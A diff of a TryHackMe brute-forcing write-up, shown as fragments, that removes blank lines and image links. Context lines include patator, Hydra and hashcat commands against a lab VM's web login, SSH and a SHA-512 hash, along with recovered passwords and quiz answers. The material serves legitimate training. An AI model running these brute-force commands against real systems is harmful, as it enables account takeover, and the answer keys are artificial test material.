@@ -4,8 +4,6 @@ Walkthrough room to look at the different tools that can be used when brute forc
 
 ![222](https://tryhackme-images.s3.amazonaws.com/room-icons/608e3293aede745c0790a05e9c3f8341.png)
 
-
-
 ### Launch The VM
 
  Start Machine
@@ -138,7 +136,6 @@ Checkout the MDN webdocs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Stat
 
 *Found*
 
-
 ### Brute forcing - Burp Suite
 
 So now we have some real requests we can examine. We can use these to template our brute force requests. In our previous analogy, we've got the language, and how the sentence is formatted, we just need to keep swapping the names out. Right click a login attempt request from our HTTP history and then click **Send to Intruder**:  
@@ -180,8 +177,6 @@ N.B - It _is_ possible to use things like Burp Suite Macros to help us get aro
 
 Answer the questions below
 
-![[Pasted image 20230205150205.png]]
-
 What's an easy way for us to tell the difference between a failed and a successful login attempt in the above?
 
 Which Response Header?
@@ -191,7 +186,6 @@ Which Response Header?
 Can we use Burp Suite to effectively brute force the login in this instance? (Yay/Nay)  
 
 *Nay*
-
 
 ### Brute forcing - Patator
 
@@ -325,7 +319,6 @@ echo "The PHPSESSID is: $SESSIONID"
 The CSRF is: b7c6ba72c6648a4e5c1984c7d4002d5c
 The PHPSESSID is: 2rhl30of3k02991eq3abftv2sm
 
-
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ nano user_bruteforce.txt               
                                                     
@@ -348,7 +341,6 @@ patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=64  timeout
   header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" \
   -x ignore:fgrep='Location: login.php' \
   -x quit:fgrep='Location: login.php'
-
 
 uhmm not work
 
@@ -426,14 +418,11 @@ rm -f /tmp/dvwa.cookie
 [i] Try 806: admin // 1qazXSW@#
 [i] Try 807: admin // 1qaz@WSX
 
-
 [i] Found!
 [i] Username: admin
 [i] Password: 1qaz@WSX
 
-
 ```
-
 
 What action can we use to show only the correct password (the answer includes '  ')?
 
@@ -444,7 +433,6 @@ If only we could IGNORE the login.php results at a certain LOCATION
 What is the admin password? 
 
 *1qaz@WSX*
-
 
 ### Brute forcing - ZAP
 
@@ -525,13 +513,6 @@ Host: 10.10.101.155
 
 ```
 
-![[Pasted image 20230205183356.png]]
-
-![[Pasted image 20230205175728.png]]
-![[Pasted image 20230205180009.png]]
-![[Pasted image 20230205183046.png]]
-
-
 What is the username you found?
 
 Check the ZAP Fuzzer Payload
@@ -543,7 +524,6 @@ What is their password?
 Check the ZAP Fuzzer Payload
 
 *rhymes*
-
 
 ### Brute forcing - SSH (Hydra + Patator)
 
@@ -625,8 +605,6 @@ MXFhekBXU1gK
 [STATUS] attack finished for 10.10.101.155 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-05 19:06:08
-
-
 
 or using patator
 
@@ -753,7 +731,6 @@ rhymes
 19:03:33 patator    INFO - Hits/Done/Skip/Fail/Size: 1/163/0/0/146624, Avg: 2 r/s, Time: 0h 1m 5s
 19:03:33 patator    INFO - To resume execution, pass --resume 16,17,16,16,17,17,16,16,16,16
 
-
 ```
 
 What is the SSH username?
@@ -767,7 +744,6 @@ What is their password (the encoded version) ?
 What kind of encoding is this? 
 
  *url*
-
 
 ### Brute forcing - Hashes
 
@@ -888,11 +864,9 @@ Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
 1 of these updates is a security update.
 To see these additional updates run: apt list --upgradable
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Sat Aug 28 16:15:10 2021 from 192.168.172.10
 tommyboy1@dvwaserver:~$ whoami
@@ -944,12 +918,10 @@ crackme:$6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8j
 └─$ cat hash_brute_heroes.txt 
 $6$m023.TJqTqsrnQYM$XvFEaHFxu6qH50AgAyBI.LYdkjtB7xZrzaIRyddpknB.5UBr5E8jc0UDJTEDgIBNQFaKPizAlHsdfTScybDOa/
 
-
 using hashcat
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ hashcat -m 1800 -a 3 hash_brute_heroes.txt ?l?l?d?l?l          
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ hashcat -m 1800 -a 3 hash_brute_heroes.txt ?l?l?d?l?l          
@@ -1107,7 +1079,6 @@ Hardware.Mon.#1..: Util: 90%
 Started: Sun Feb  5 19:58:47 2023
 Stopped: Sun Feb  5 20:13:16 2023
 
-
 or john
 
 ┌──(kali㉿kali)-[~/Downloads]
@@ -1131,7 +1102,6 @@ Session aborted
 
 tooks more time
 ```
-
 
 Which user can we crack the password for?
 
